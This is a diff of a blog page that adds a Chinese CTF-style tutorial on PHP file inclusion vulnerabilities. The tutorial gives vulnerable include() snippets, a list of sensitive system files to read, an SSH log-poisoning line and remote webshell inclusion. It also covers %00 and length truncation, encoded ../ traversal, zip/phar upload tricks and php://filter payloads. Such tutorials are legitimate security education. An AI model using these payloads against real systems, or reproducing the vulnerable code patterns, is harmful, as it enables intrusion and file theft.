@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFer 网络安全 渗透测试">
+    <meta name="keywords" content="PHP文件包含漏洞基础, CTFer 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>孤独星球</title>
+    <title>PHP文件包含漏洞基础 | 孤独星球</title>
 
     <link rel="icon" type="image/jpeg" href="https://i.loli.net/2021/11/10/guPx1Olpo6HIYai.jpg">
 
@@ -447,12 +447,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928015642.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">PHP文件包含漏洞基础</h1>
                 </div>
             </div>
         </div>
@@ -571,9 +571,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -592,21 +596,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-10
+                    2021-11-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
 
@@ -624,7 +628,261 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                google-site-verification: google110e5e5e14c8dcf0.html
+                <h1 id="一、文件包含漏洞"><a href="#一、文件包含漏洞" class="headerlink" title="一、文件包含漏洞"></a>一、文件包含漏洞</h1><p>文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p>
+<h1 id="二、漏洞产生原因"><a href="#二、漏洞产生原因" class="headerlink" title="二、漏洞产生原因"></a>二、漏洞产生原因</h1><p>服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害</p>
+<p>举一个简单的例子</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里的<code>filename</code>参数没有经过过滤，直接赋值给<code>include()</code>函数，我们就可以修改<code>filenname</code>的值，执行其他操作</p>
+<p>我们在同目录下创建一个<code>info.txt</code></p>
+<p>内容如下</p>
+<p><img src="https://i.loli.net/2021/09/29/KGvSAi4Ha9VIeR5.png"></p>
+<p>这样我们只需要把<code>info.txt</code>包含进去即可解析</p>
+<p><img src="https://i.loli.net/2021/09/29/f41k8sFO7qRdTGB.png"></p>
+<h1 id="三、PHP常用的包含函数"><a href="#三、PHP常用的包含函数" class="headerlink" title="三、PHP常用的包含函数"></a>三、PHP常用的包含函数</h1><p>在php中，常用的为以下4个函数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中<code>include</code>和<code>require</code>的区别主要是<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p><img src="https://i.loli.net/2021/09/29/OSYPlCQxfTcrn29.png"></p>
+<p><code>include_once</code>，<code>require_once</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p><img src="https://i.loli.net/2021/09/29/8GWct7SjCYgzXx4.png"></p>
+<h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>文件包含利用有两种</p>
+<pre class="line-numbers language-none"><code class="language-none">1.包含本地服务器的文件
+2.包含其他服务器的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>而且，包含的时候，不一定要包含php文件</p>
+<p>只要文件中有一块完整的php代码即可</p>
+<p>例如<code>a.txt</code></p>
+<p>内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也是可以的</p>
+<h2 id="1-包含本地服务器的文件"><a href="#1-包含本地服务器的文件" class="headerlink" title="1.包含本地服务器的文件"></a>1.包含本地服务器的文件</h2><p>举一个例子，利用CTFSHOW的靶机</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集）</p>
+<pre class="line-numbers language-none"><code class="language-none">/etc/apache2/*
+#Apache配置文件，可以获知Web目录、服务端口等信息
+/etc/nginx/*
+#Nginx配置文件，可以获知Web目录、服务端口等信息
+/etc/crontab
+#定时任务文件
+/etc/environment
+#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况
+/etc/hostname
+#主机名
+/etc/hosts
+#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名
+/etc/issue
+#系统版本信息
+/etc/mysql/*
+#MYSQL配置文件
+/etc/php/*
+#PHP配置文件
+/proc 目录
+#/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可
+/proc/[pid]/cmdline
+#cmdline可读出比较敏感的信息
+# ssh日志，攻击方法：
+ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1
+/var/log/auth.log
+# apache日志
+/var/log/apache2/[access.log|error.log]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231407">https://www.anquanke.com/post/id/231407</a></p>
+</blockquote>
+<p>这里可以读取任意文件，我们可以试着读<code>/etc/passwd</code></p>
+<p><img src="https://i.loli.net/2021/09/29/BKbZx2hzpq18kvI.png"></p>
+<h2 id="2-包含远程服务器的文件"><a href="#2-包含远程服务器的文件" class="headerlink" title="2.包含远程服务器的文件"></a>2.包含远程服务器的文件</h2><p>这里需要前提</p>
+<pre class="line-numbers language-none"><code class="language-none">allow_url_fopen = On 是否允许打开远程文件
+allow_url_include = On 是否允许include/require远程文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这里可以本地测试一下，利用虚拟机做远程服务器</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里存在文件包含漏洞</p>
+<p><img src="https://i.loli.net/2021/09/29/ipOaUYZBuwmlzdT.png"></p>
+<p>“服务器”上存在webshell</p>
+<p>传参：</p>
+<pre class="line-numbers language-none"><code class="language-none">http://localhost/include.php?page=http://192.168.179.129/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.loli.net/2021/09/29/HZT1fJxPSLtVd6m.png"></p>
+<p>可以看到成功包含到了webshell</p>
+<h2 id="3-限制后缀名"><a href="#3-限制后缀名" class="headerlink" title="3.限制后缀名"></a>3.限制后缀名</h2><p>例子</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">".H3h3QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为<code>H3h3QAQ</code></p>
+<p>所以我们需要Bypass</p>
+<h3 id="1-00截断"><a href="#1-00截断" class="headerlink" title="(1).%00截断"></a>(1).%00截断</h3><p>需要PHP&lt;5.3.4并且magic_quotes_gpc = Off</p>
+<pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="2-长度截断"><a href="#2-长度截断" class="headerlink" title="(2).长度截断"></a>(2).长度截断</h3><p>PHP版本&lt;=5.2.?</p>
+<blockquote>
+<p>Windows下目录最大长度为256字节，超出的部分会被丢弃掉<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃掉</p>
+</blockquote>
+<p>构造payload的时候超出限制即可</p>
+<p>类似于</p>
+<pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt....................*n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="(3).伪协议"></a>(3).伪协议</h3><pre class="line-numbers language-none"><code class="language-none">zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）
+phar://文件路径/phar文件名称/phar内的文件名称
+phar://协议与zip://类似，同样可以访问zip格式压缩包内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>多配合在上传题使用</p>
+<p>若发现只有jpg、png才可以上传文件</p>
+<p>则可以利用phar伪协议</p>
+<p>写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传<br>提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可</p>
+<pre class="line-numbers language-none"><code class="language-none">?file=zip://D:\zip.jpg%23phpinfo
+?file=phar://zip.zip/phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="4-限制前缀"><a href="#4-限制前缀" class="headerlink" title="4.限制前缀"></a>4.限制前缀</h2><p>例如<code>../</code>被过滤</p>
+<p>可以利用url编码</p>
+<pre class="line-numbers language-none"><code class="language-none">../
+%2e%2e%2f
+..%2f
+%2e%2e/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者二次编码</p>
+<pre class="line-numbers language-none"><code class="language-none">../
+%252e%252e%252f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议</h2><h3 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="(1).file:// 协议"></a>(1).file:// 协议</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
+<pre class="line-numbers language-none"><code class="language-none">POC
+/include.php?file=file://phpinfo.txt
+/include.php?file=http://127.0.0.1/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-php-协议"><a href="#2-php-协议" class="headerlink" title="(2).php://协议"></a>(2).php://协议</h3><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p>
+<pre class="line-numbers language-none"><code class="language-none">php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th><strong>协议</strong></th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php://input</td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td>php://output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php://fd</td>
+<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php://memory php://temp</td>
+<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<h4 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php://filter"></a>1.php://filter</h4><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p>
+<p>对于php://来说，是支持多种过滤器嵌套的</p>
+<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/[read|write]=[过滤器1]|[过滤器2]/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）
+#如果<span class="token operator">|</span>被过滤掉了，可以使用多过滤器<span class="token punctuation">:</span>
+php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/string.rot13/</span>resource<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/convert.base64-encode/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）
+嵌套过程的执行流程为从左到右<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其实是可以简写成这样的<code>php://filter/[过滤器]</code> ，php会自己进行识别。</p>
+<p>过滤器列表:</p>
+<table>
+<thead>
+<tr>
+<th>过滤器名称</th>
+<th>说明</th>
+<th>类别</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>rot13转换</td>
+<td>字符串过滤器</td>
+<td>PHP&gt;4.3.0</td>
+</tr>
+<tr>
+<td>string.toupper、string.tolower</td>
+<td>大小写互转</td>
+<td>字符串过滤器</td>
+<td>PHP&gt;5.0.0</td>
+</tr>
+<tr>
+<td>convert.base64-encode、convert.base64-decode</td>
+<td>base64编码转换</td>
+<td>转换过滤器</td>
+<td>PHP&gt;5.0.0</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode、convert.quoted-printable-decode</td>
+<td>URL编码转换</td>
+<td>转换过滤器</td>
+<td>PHP&gt;5.0.0</td>
+</tr>
+<tr>
+<td>convert.iconv.编码1.编码2</td>
+<td>任意编码转换</td>
+<td>转换过滤器</td>
+<td>PHP&gt;5.0.0</td>
+</tr>
+<tr>
+<td>zlib.deflate、zlib.inflate</td>
+<td>zlib压缩</td>
+<td>压缩过滤器</td>
+<td>PHP&gt;5.1.0</td>
+</tr>
+<tr>
+<td>bzip2.compress、bzip2.decompress</td>
+<td>zlib压缩</td>
+<td>压缩过滤器</td>
+<td>PHP&gt;5.1.0</td>
+</tr>
+</tbody></table>
+<h2 id="6-PHP伪协议常用函数"><a href="#6-PHP伪协议常用函数" class="headerlink" title="6.PHP伪协议常用函数"></a>6.PHP伪协议常用函数</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bmth666/article/details/104616201">https://blog.csdn.net/bmth666/article/details/104616201</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231407#h3-6">https://www.anquanke.com/post/id/231407#h3-6</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jzking121/p/15144416.html">https://www.cnblogs.com/jzking121/p/15144416.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+</blockquote>
+
                 
             </div>
             <hr/>
@@ -650,7 +908,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://h3h3qaq.github.io/google1xxxxxxx0.html">https://h3h3qaq.github.io/google1xxxxxxx0.html</a>
+                    <a href="https://h3h3qaq.github.io/posts/f4224d8e.html">https://h3h3qaq.github.io/posts/f4224d8e.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -687,7 +945,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1157,18 +1419,17 @@ new Valine({
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/google1xxxxxxx0.html">
+                <a href="/posts/ae3250a1.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020502.jpg" class="responsive-img" alt="PHP反序列化漏洞基础">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">PHP反序列化漏洞基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1178,9 +1439,9 @@ new Valine({
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1189,7 +1450,14 @@ new Valine({
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -1197,16 +1465,16 @@ new Valine({
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/google1xxxxxxx0.html">
+                <a href="/posts/12a5c357.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021707.jpg" class="responsive-img" alt="PHP代码执行漏洞">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">PHP代码执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1227,7 +1495,14 @@ new Valine({
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
